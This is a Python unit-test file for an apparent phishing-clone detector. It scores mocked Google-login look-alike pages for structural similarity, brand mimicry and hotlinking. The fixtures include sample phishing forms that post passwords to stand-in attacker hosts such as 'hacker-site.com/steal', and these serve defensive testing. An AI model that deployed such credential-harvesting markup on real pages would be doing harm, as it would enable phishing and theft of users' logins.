import unittest
from unittest.mock import MagicMock, patch
import os
import sys

# Add root directory to sys.path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.core.clone_engine import CloneEngine

class TestCloneForensics(unittest.TestCase):
    def setUp(self):
        self.engine = CloneEngine()
        
        # Real Site Data (Mocked)
        self.real_google_html = """
        <html>
            <title>Google Account Login</title>
            <div>
                <form action="https://accounts.google.com/login">
                    <input type="email"><input type="password">
                    <button>Next</button>
                </form>
            </div>
            <script src="https://accounts.google.com/static/js/main.js"></script>
            <script src="https://accounts.google.com/static/js/auth.js"></script>
            <a href="/help">Help</a><img src="/logo.png">
        </html>
        """

    @patch('requests.get')
    def test_clone_bulk_forensics(self, mock_get):
        """Test various clone phishing scenarios to verify forensic accuracy."""
        print("\n" + "="*90)
        print(f"{'SCENARIO':<30} | {'RISK':<5} | {'DNA MATCH':<10} | {'BRAND MIMIC'}")
        print("-" * 90)

        test_scenarios = [
            {
                "desc": "Identical Lazy Clone",
                "susp_html": """
                    <html>
                        <title>Google Login - Secure</title>
                        <div>
                            <form action="http://hacker-site.com/steal">
                                <input type="text"><input type="password">
                                <button>Sign In</button>
                            </form>
                        </div>
                        <script src="https://accounts.google.com/static/js/main.js"></script>
                        <script src="https://accounts.google.com/static/js/auth.js"></script>
                        <a href="#">Forgot?</a><img src="logo.png">
                    </html>
                """,
                "url": "http://login-google-verify.net",
                "expected_brand": "google.com",
                "min_risk": 80,
                "should_detect": True
            },
            {
                "desc": "Form Hijacker Only",
                "susp_html": """
                    <html>
                        <title>Google Sign-in</title>
                        <form action="http://malicious.com/post"></form>
                        <div></div><div></div> <!-- Different structure -->
                    </html>
                """,
                "url": "http://google-check.com",
                "expected_brand": "google.com",
                "min_risk": 50,
                "should_detect": True
            },
            {
                "desc": "Legitimate Site",
                "susp_html": """
                    <html>
                        <title>My Personal Blog</title>
                        <p>Welcome to my site</p>
                        <a href="/about">About</a>
                    </html>
                """,
                "url": "https://myblog.com",
                "expected_brand": "None",
                "min_risk": 0,
                "should_detect": False
            },
            {
                "desc": "Structural Match (No Mimic)",
                "susp_html": """
                    <html>
                        <title>My Generic Login Page</title>
                        <div>
                            <form action="/login">
                                <input type="text"><input type="password">
                                <button>Submit</button>
                            </form>
                        </div>
                        <script src="/js/app.js"></script>
                        <a href="/help">Help</a><img src="/logo.png">
                    </html>
                """,
                "url": "https://another-legit-site.com",
                "expected_brand": "None",
                "min_risk": 0,
                "should_detect": False
            }
        ]

        passed_count = 0
        for scenario in test_scenarios:
            # Mock responses: 1st for suspicious site, 2nd for real site (if brand detected)
            mock_susp = MagicMock()
            mock_susp.text = scenario['susp_html']
            mock_susp.status_code = 200
            
            mock_real = MagicMock()
            mock_real.text = self.real_google_html
            mock_real.status_code = 200
            
            mock_get.side_effect = [mock_susp, mock_real]
            
            # Execute analysis
            res = self.engine.analyze(scenario['url'])
            
            risk = res['calculated_risk']
            dna = res['structural_similarity']
            brand = res['mimicked_brand']
            
            print(f"{scenario['desc']:<30} | {risk:<5} | {dna:<10.1f}% | {brand}")
            
            # Verifications
            self.assertEqual(brand, scenario['expected_brand'], f"Brand mismatch for {scenario['desc']}")
            self.assertGreaterEqual(risk, scenario['min_risk'], f"Risk too low for {scenario['desc']}")
            if scenario['should_detect']:
                self.assertTrue(res['clone_detected'], f"Clone NOT detected for {scenario['desc']}")
            
            passed_count += 1

        accuracy = (passed_count / len(test_scenarios)) * 100
        print("="*90)
        print(f"CLONE FORENSIC SCAN ACCURACY: {accuracy:.2f}% ({passed_count}/{len(test_scenarios)})")

    @patch('requests.get')
    def test_hotlinking_detection(self, mock_get):
        """Verify that hotlinking scripts from real domain increases risk."""
        # Suspicious site hotlinking from google.com
        susp_html = """
        <html>
            <title>Google Login</title>
            <script src="https://accounts.google.com/script1.js"></script>
            <script src="https://accounts.google.com/script2.js"></script>
        </html>
        """
        mock_susp = MagicMock()
        mock_susp.text = susp_html
        
        mock_real = MagicMock()
        mock_real.text = self.real_google_html
        
        mock_get.side_effect = [mock_susp, mock_real]
        
        res = self.engine.analyze("http://fake-google.com")
        self.assertTrue(any("Hotlinking" in r for r in res['mismatch_reason']))
        self.assertGreaterEqual(res['calculated_risk'], 30)

if __name__ == '__main__':
    unittest.main(verbosity=2)
